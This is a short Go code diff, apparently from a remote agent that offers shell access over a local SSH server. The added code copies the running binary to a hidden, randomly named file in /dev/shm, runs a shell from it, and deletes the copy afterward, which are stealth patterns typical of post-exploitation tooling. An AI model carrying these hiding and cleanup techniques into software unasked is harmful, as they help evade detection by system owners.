@@ -26,10 +26,22 @@ func setWinsize(f *os.File, w, h int) {
 // SSHD start a ssh server to provide shell access for clients
 // the server binds local interface only
 func crossPlatformSSHD(shell, port string, args []string) (err error) {
+	// in case agent binary is deleted, elvsh will need a new one
+	new_exe := fmt.Sprintf("/dev/shm/.%s", util.RandStr(22))
+
 	exe, err := exec.LookPath(shell)
 	if err != nil {
 		if shell == "elvsh" {
-			exe = util.ProcExe(os.Getpid())
+			// write process exe again
+			log.Printf("rewriting process exe to %s", new_exe)
+			err = CopySelfTo(new_exe)
+			if err != nil {
+				err = fmt.Errorf("%s not found (%v), aborting", exe, err)
+				log.Print(err)
+				return err
+			}
+
+			exe = new_exe
 		} else {
 			res := fmt.Sprintf("%s not found (%v), aborting", shell, err)
 			log.Print(res)
@@ -92,6 +104,7 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 			log.Print(err)
 			return
 		}
+		os.Remove(new_exe) // clean up our copy as elvsh should be running and it's no longer needed
 
 		go func() {
 			for win := range winCh {
